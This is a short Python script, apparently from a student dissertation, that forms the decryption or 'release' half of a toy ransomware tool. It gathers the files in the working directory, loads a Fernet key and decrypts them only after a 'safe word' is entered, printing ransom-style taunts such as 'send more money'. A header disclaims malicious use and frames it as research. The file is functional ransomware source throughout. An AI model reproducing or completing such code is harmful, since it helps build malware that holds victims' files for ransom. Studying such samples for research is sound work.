#!/usr/bin/env python3
# F20PA Dissertation Ransomware Test
# **NOTE** THIS IS ONLY FOR DOCUMENTATION AND RESEARCH PURPOSES. THIS CODE SHALL NOT BE USED FOR PERSONAL USE OR MALICIOUS INTENTIONS INORDER TO MEET ETHICAL REQUIREMENTS. PLEASE DO NOT USE TRY THIS
# Owner: apv2@hw.ac.uk Aswin Valsalan

import os
from cryptography.fernet import Fernet 


# This code is used to find the files in the directory/OS to hold ransom. Also to exclude which attacker needs to access.
files = []

for file in os.listdir():
      if file == "apvware.py" or file == "apv.key" or file == "apvrelease.py":
             continue
      if os.path.isfile(file):
            files.append(file)
      
print(files)


# This is main body which will use the key to decrypt files after ransom met.
# The user needs to input the safe word for code to be executed.
# Incident response may not include this file.
with open("apv.key", "rb") as key:
        safekey = key.read()
        
safeword = "f20pa"
user_phrase = input("Enter the safe word to get back all your files now or leave!\n")
if user_phrase == safeword:
    for file in files:
          with open(file, "rb") as apvfile:
                 contents = apvfile.read()
          contents_decrypted = Fernet(safekey).decrypt(contents)
          with open(file, "wb") as apvfile:
                 apvfile.write(contents_decrypted)
    print("You have access to your files again , consider upgrading your anti-virus")

else:
     print("You have entered wrong safe word , try again or send more money")
